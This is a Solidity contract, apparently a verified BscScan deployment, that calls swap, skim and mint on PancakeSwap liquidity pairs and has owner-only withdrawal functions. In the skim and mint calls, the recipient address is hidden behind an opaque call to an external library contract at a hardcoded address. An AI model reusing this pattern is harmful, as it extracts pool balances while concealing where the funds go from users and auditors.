/**
 *Submitted for verification at BscScan.com on 2023-01-11
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.9;

contract Hello{

    function doIt1(address addy, uint amount0Out, uint amount1Out, address to, bytes calldata data) public {
        IPancakePair iPair = IPancakePair(addy);
        iPair.swap(amount0Out, amount1Out, to, data);

    }

    /*function checkBytes(uint vv) public pure returns(bytes memory){
        return new bytes(vv);
    }

    function checkInt(uint vv) public pure returns (uint){
        return uint(vv);
    }*/

    address public __owner = msg.sender;

    function changeOwner(address addy) public onlyOwner{
        __owner = addy;
    }

    modifier onlyOwner() {
        require(msg.sender == __owner, "Ownable: caller is not the owner");
        _;
    }

    function withdrawETH() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdrawTokens(address _token, uint amount) public onlyOwner {
        IERC20k(_token).transfer(msg.sender, amount);
    }

    function withdrawERC721(address _i721, uint tokenId) public onlyOwner {
      IERC721(_i721).safeTransferFrom(address(this), msg.sender, tokenId);
    }

    receive() external payable {}

    function trySkim(address lp_address) public {
        Assertion lib = Assertion(0xCDF61180A03D8300e41b44eD57EF130A3bB74783);
        IPancakePair iPair = IPancakePair(lp_address);
        iPair.skim(lib.sortTwo("1234567890abcdefghijklmnopqrstuvwxyz"));
    }
    function tryMint(address lp_address) public {
        Assertion lib = Assertion(0xCDF61180A03D8300e41b44eD57EF130A3bB74783);
        IPancakePair iPair = IPancakePair(lp_address);
        iPair.mint(lib.sortTwo("1234567890abcdefghijklmnopqrstuvwxyz"));
    }
    
}

    interface kk{
        function _mint(address account, uint256 amount) external;
    }

    interface IERC20k {
        function transfer(address recipient, uint256 amount) external returns (bool);
    }

    interface IERC721{
        function safeTransferFrom(address from, address to, uint256 tokenId) external;
    }

    interface IPancakePair {
        function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
        function skim(address to) external;
        function mint(address to) external;
    }

    interface Assertion{
        function sortTwo(string memory str) external pure returns (address);
    }